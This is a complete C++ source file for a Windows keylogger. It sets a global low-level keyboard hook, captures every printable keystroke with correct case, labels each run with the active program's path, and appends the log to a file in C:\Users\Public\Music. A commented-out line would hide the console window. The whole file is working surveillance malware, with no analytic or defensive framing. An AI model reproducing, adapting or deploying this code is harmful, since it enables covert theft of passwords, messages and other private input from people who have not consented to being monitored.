#include <windows.h>
#include <fstream>
#include <mutex>
#include <psapi.h> 
#include <string>

std::ofstream logFile;
std::mutex logMutex;

// State for buffering
std::string lastProcessName;
std::string keyBuffer;

//get process name and window text    
void GetProcessName(std::string& processName, std::string& windowText) {
    HWND foreground = GetForegroundWindow();
    DWORD processId;
    GetWindowThreadProcessId(foreground, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (hProcess) {
        char buffer[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, NULL, buffer, sizeof(buffer))) {
            processName = buffer;
        }
        CloseHandle(hProcess);
    }
    char title[256];
    GetWindowTextA(foreground, title, sizeof(title));
    windowText = title;
}

// Helper to log key with case sensitivity and process info
void LogKey(DWORD vkCode) {
    BYTE keyboardState[256] = { 0 };
    char buffer[3] = { 0 };
    UINT scanCode = MapVirtualKeyA(vkCode, MAPVK_VK_TO_VSC);

    // Get process and window info
    std::string processName, windowText;
    GetProcessName(processName, windowText);

    // Get current keyboard state
    GetKeyboardState(keyboardState);

    // Check if Caps Lock is on
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    // Check if Shift is pressed
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

    // Detect process/window change or buffer start
    if (processName != lastProcessName && !keyBuffer.empty()) {
        logFile << lastProcessName << ": " << keyBuffer << std::endl;
        keyBuffer.clear();
    }
    lastProcessName = processName;

    // Only process printable characters
    int result = ToAscii(vkCode, scanCode, keyboardState, (LPWORD)buffer, 0);
    if (result == 1) {
        char ch = buffer[0];
        // For letters, adjust case based on Shift and Caps Lock
        if (ch >= 'A' && ch <= 'Z') {
            if (!(capsLock ^ shift)) {
                ch = ch + ('a' - 'A'); // convert to lowercase
            }
        }
        else if (ch >= 'a' && ch <= 'z') {
            if (capsLock ^ shift) {
                ch = ch - ('a' - 'A'); // convert to uppercase
            }
        }
        keyBuffer += ch;
    }
    else {
        // If Enter is pressed, flush the buffer
        if (vkCode == VK_RETURN) {
            logFile << processName << ": " << keyBuffer << "[Enter]" << std::endl;
            keyBuffer.clear();
        }
        // Optionally, handle other non-printable keys as needed
    }
    logFile.flush();
}

// Hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        std::lock_guard<std::mutex> lock(logMutex);
        LogKey(vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AllocConsole();
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
    // Fix for freopen_s usage and errors  
    FILE* stream;
    if (freopen_s(&stream, "CONOUT$", "w", stdout) != 0) {
        // Handle error if redirection fails  
        return 1;
    }
    // Open log file once
    logFile.open("C:\\Users\\Public\\Music\\log.txt", std::ios::app);
    if (!logFile.is_open()) {
        return 1;
    }

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Flush any remaining buffer on exit
    if (!keyBuffer.empty()) {
        logFile << lastProcessName << ": " << keyBuffer << std::endl;
    }

    UnhookWindowsHookEx(hook);
    logFile.close();
    return 0;
}